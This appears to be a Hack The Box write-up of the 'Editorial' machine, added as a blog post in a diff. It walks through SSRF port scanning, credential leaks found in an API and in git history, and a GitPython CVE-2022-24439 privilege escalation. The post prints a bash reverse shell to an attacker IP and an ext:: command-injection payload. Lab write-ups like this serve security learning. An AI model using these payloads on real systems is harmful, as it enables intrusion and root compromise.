@@ -1,0 +1,358 @@
+---
+title: Editorial Writeup - Hack The Box
+description: Exploiting SSRF for initial access, then using a GitPython vulnerability for privilege escalation
+author: Nontas Bakoulas
+date: 2025-10-09
+category: HTB Machines
+reading_time: 15
+---
+
+## Enumeration
+Let's start with an `nmap` scan:
+```console title="Nmap scan"
+nontas@local$ nmap -sVC 10.129.70.198
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-09 16:00 EEST
+Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 15.45% done; ETC: 16:00 (0:00:16 remaining)
+Nmap scan report for 10.129.70.198
+Host is up (0.049s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 0dedb29ce253fbd4c8c1196e7580d864 (ECDSA)
+|_  256 0fb9a7510e00d57b5b7c5fbf2bed53a0 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://editorial.htb
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 31.07 seconds
+```
+
+The web app tried to redirect us to `editorial.htb`, so we add it to `/etc/hosts`:
+```console
+nontas@local$ echo '10.129.70.198 editorial.htb' >> /etc/hosts
+```
+
+Navigating to it shows the following: ![Web application homepage](/images/blog/editorial/20251009180610.png)
+
+The about page shows an email at the bottom with the domain `tiempoarriba.htb`, so we also add it to `/etc/hosts`: ![About page with email](/images/blog/editorial/20251009180708.png)
+
+The "Publish with us" (`/upload`) page shows the following form: ![Upload form](/images/blog/editorial/20251009180947.png)
+
+### SSRF
+Notice that we can change the image of the book cover either via a URL or via an uploaded image.
+
+We'll test if this form is vulnerable to **SSRF (Server Side Request Forgery)**.
+
+First, start a nc listener:
+```console title="NC listener"
+nontas@local$ nc -lnvp 1234
+```
+
+Make a request with your local listener URL: ![SSRF test request](/images/blog/editorial/20251009193130.png)
+
+And we do receive a callback back at our listener:
+```console title="SSRF callback"
+nontas@local$ nc -lnvp 1234
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.129.70.198.
+Ncat: Connection from 10.129.70.198:48362.
+GET / HTTP/1.1
+Host: 10.10.14.78:1234
+User-Agent: python-requests/2.25.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+```
+
+This means that the application **is vulnerable to SSRF**.
+
+## Initial Foothold
+
+We'll try and scan for open ports on the host using Caido Automate. We'll scan for all ports (1-65535) using the payload `http://127.0.0.1:PORT`: ![Port scanning setup](/images/blog/editorial/20251009195834.png)
+
+<Callout title="FFUF Alternative" type="info">
+If you want to use `ffuf`, save the entire request into a file (e.g. `ssrf.req`) with the `FUZZ` keyword inside, and do:
+```bash
+ffuf -request ssrf.req -request.proto http -w <(seq 1 65535) -fr ".jpeg"
+```
+</Callout>
+
+Sorting by response length, we see that port `5000` gives us a different path (not the `.jpeg` image): ![Port 5000 response](/images/blog/editorial/20251009200024.png)
+
+<Callout title="HTTPQL Query" type="info">
+You can also use the following HTTPQL query: ![HTTPQL query](/images/blog/editorial/20251009200239.png)
+</Callout>
+
+Let's go back to the web app and add `http://127.0.0.1:5000` as the URL and submit it: ![Port 5000 request](/images/blog/editorial/20251009201727.png)
+
+If we `[Right click] > Open Image in New Tab`, we download a file locally: ![Downloaded file](/images/blog/editorial/20251009201826.png)
+
+It's a `JSON` file, so if we format it with `cat file.txt | jq` we get the following contents:
+```json
+{
+  "messages": [
+    {
+      "promotions": {
+        "description": "Retrieve a list of all the promotions in our library.",
+        "endpoint": "/api/latest/metadata/messages/promos",
+        "methods": "GET"
+      }
+    },
+    {
+      "coupons": {
+        "description": "Retrieve the list of coupons to use in our library.",
+        "endpoint": "/api/latest/metadata/messages/coupons",
+        "methods": "GET"
+      }
+    },
+    {
+      "new_authors": {
+        "description": "Retrieve the welcome message sended to our new authors.",
+        "endpoint": "/api/latest/metadata/messages/authors",
+        "methods": "GET"
+      }
+    },
+    {
+      "platform_use": {
+        "description": "Retrieve examples of how to use the platform.",
+        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
+        "methods": "GET"
+      }
+    }
+  ],
+  "version": [
+    {
+      "changelog": {
+        "description": "Retrieve a list of all the versions and updates of the api.",
+        "endpoint": "/api/latest/metadata/changelog",
+        "methods": "GET"
+      }
+    },
+    {
+      "latest": {
+        "description": "Retrieve the last version of api.",
+        "endpoint": "/api/latest/metadata",
+        "methods": "GET"
+      }
+    }
+  ]
+}
+```
+
+The interesting endpoint here is `/api/latest/metadata/messages/authors` (but check the others as well).
+
+Make a request to `http://127.0.0.1:5000/api/latest/metadata/messages/authors` and you'll get the following file:
+```console title="API response"
+nontas@local$ curl http://editorial.htb/static/uploads/f88fedf6-ba04-44ef-984b-db15a0e417e3 -so output.txt
+nontas@local$ cat output.txt | jq
+{
+  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
+}
+```
+We find the credentials `dev:dev080217_devAPI!@`
+
+Use them to SSH into the server and get the flag:
+```console title="SSH login"
+nontas@local$ ssh dev@10.129.70.198
+<SNIP>
+dev@editorial:~$ id
+uid=1001(dev) gid=1001(dev) groups=1001(dev)
+dev@editorial:~$ cat user.txt
+```
+
+## Lateral Movement
+Listing the home directory shows the directory `apps/`:
+```console
+dev@editorial:~$ ls
+apps  user.txt
+```
+
+Inside it there's the `.git/` directory, which means that the `apps/` directory is a git repository.
+
+However, the repository is empty. Running `git status` shows the following:
+```console title="Git status"
+dev@editorial:~/apps$ git status
+On branch master
+Changes not staged for commit:
+  (use "git add/rm <file>..." to update what will be committed)
+  (use "git restore <file>..." to discard changes in working directory)
+        deleted:    app_api/app.py
+        deleted:    app_editorial/app.py
+        deleted:    app_editorial/static/css/bootstrap-grid.css
+        deleted:    app_editorial/static/css/bootstrap-grid.css.map
+        deleted:    app_editorial/static/css/bootstrap-grid.min.css
+        deleted:    app_editorial/static/css/bootstrap-grid.min.css.map
+<SNIP>
+        deleted:    app_editorial/static/js/bootstrap.js
+        deleted:    app_editorial/static/js/bootstrap.js.map
+        deleted:    app_editorial/static/js/bootstrap.min.js
+        deleted:    app_editorial/static/js/bootstrap.min.js.map
+        deleted:    app_editorial/templates/about.html
+        deleted:    app_editorial/templates/index.html
+        deleted:    app_editorial/templates/upload.html
+
+no changes added to commit (use "git add" and/or "git commit -a")
+```
+
+We see a bunch of files deleted. Let's check `git log` to get more info:
+```console title="Git log"
+dev@editorial:~/apps$ git log
+commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)
+Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
+Date:   Sun Apr 30 21:04:21 2023 -0500
+
+    fix: bugfix in api port endpoint
+
+commit dfef9f20e57d730b7d71967582035925d57ad883
+Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
+Date:   Sun Apr 30 21:01:11 2023 -0500
+
+    change: remove debug and update api port
+
+commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
+Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
+Date:   Sun Apr 30 20:55:08 2023 -0500
+
+    change(api): downgrading prod to dev
+
+    * To use development environment.
+
+commit 1e84a036b2f33c59e2390730699a488c65643d28
+Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
+Date:   Sun Apr 30 20:51:10 2023 -0500
+
+    feat: create api to editorial info
+
+    * It (will) contains internal info about the editorial, this enable
+       faster access to information.
+
+commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
+Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
+Date:   Sun Apr 30 20:48:43 2023 -0500
+
+    feat: create editorial app
+
+    * This contains the base of this project.
+    * Also we add a feature to enable to external authors send us their
+       books and validate a future post in our editorial.
+```
+
+The commit `change(api): downgrading prod to dev` seems interesting. Let's see the changes:
+```console title="Git commit diff"
+dev@editorial:~/apps$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
+commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
+Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
+Date:   Sun Apr 30 20:55:08 2023 -0500
+
+    change(api): downgrading prod to dev
+
+    * To use development environment.
+
+diff --git a/app_api/app.py b/app_api/app.py
+index 61b786f..3373b14 100644
+--- a/app_api/app.py
++++ b/app_api/app.py
+@@ -64,7 +64,7 @@ def index():
+ @app.route(api_route + '/authors/message', methods=['GET'])
+ def api_mail_new_authors():
+     return jsonify({
+-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
++        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+     }) # TODO: replace dev credentials when checks pass
+
+ # -------------------------------
+```
+
+We find a new set of credentials: `prod:080217_Producti0n_2023!@`.
+
+Switch to the `prod` user:
+```console title="User switch"
+dev@editorial:~/apps$ su prod
+Password:
+prod@editorial:/home/dev/apps$
+```
+
+Let's check the commands that `prod` can run with `sudo`:
+```console title="Sudo privileges"
+prod@editorial:/home/dev/apps$ sudo -l
+[sudo] password for prod:
+Matching Defaults entries for prod on editorial:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User prod may run the following commands on editorial:
+    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
+```
+
+Seems like they can run the file `/opt/internal_apps/clone_changes/clone_prod_change.py`
+
+## Privilege Escalation
+Let's check the contents of the script:
+```python
+#!/usr/bin/python3
+
+import os
+import sys
+from git import Repo
+
+os.chdir('/opt/internal_apps/clone_changes')
+
+url_to_clone = sys.argv[1]
+
+r = Repo.init('', bare=True)
+r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
+```
+
+Let's also check the permissions of the file:
+```console
+prod@editorial:/home/dev/apps$ ls -l /opt/internal_apps/clone_changes/clone_prod_change.py
+-rwxr-x--- 1 root prod 256 Jun  4  2024 /opt/internal_apps/clone_changes/clone_prod_change.py
+```
+
+The script uses the `GitPython` library. A quick google search of either `gitpython exploit` or `from git import Repo vulnerability` leads us to `CVE-2022-24439`.
+
+<Callout title="GitPython Version" type="info">
+Running `pip freeze` anywhere shows the version of currently installed libraries. `GitPython`'s version is `3.1.29`, so it's vulnerable.
+</Callout>
+
+In [this](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858) link, we find the following **PoC**:
+```python
+from git import Repo
+r = Repo.init('', bare=True)
+r.clone_from('ext::sh -c touch% /tmp/pwned', 'tmp', multi_options=["-c protocol.ext.allow=always"])
+```
+
+First, create a malicious reverse shell script called `shell.sh` inside `/tmp`:
+```console
+prod@editorial:/home/dev/apps$ echo 'bash -i >& /dev/tcp/10.10.14.78/4321 0>&1' > /tmp/shell.sh
+```
+
+Start your `nc` listener:
+```console title="NC listener"
+nontas@local$ nc -lnvp 4321
+```
+
+Execute the python script:
+```console title="GitPython exploit"
+prod@editorial:/home/dev/apps$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% /tmp/shell.sh'
+```
+
+And we get a connection:
+```console title="Root shell"
+nontas@local$ nc -lnvp 4321
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4321
+Ncat: Listening on 0.0.0.0:4321
+Ncat: Connection from 10.129.70.198.
+Ncat: Connection from 10.129.70.198:44394.
+root@editorial:/opt/internal_apps/clone_changes# id
+uid=0(root) gid=0(root) groups=0(root)
+root@editorial:/opt/internal_apps/clone_changes# cat /root/root.txt
+```
+
+We have successfully completed the **Editorial** machine!
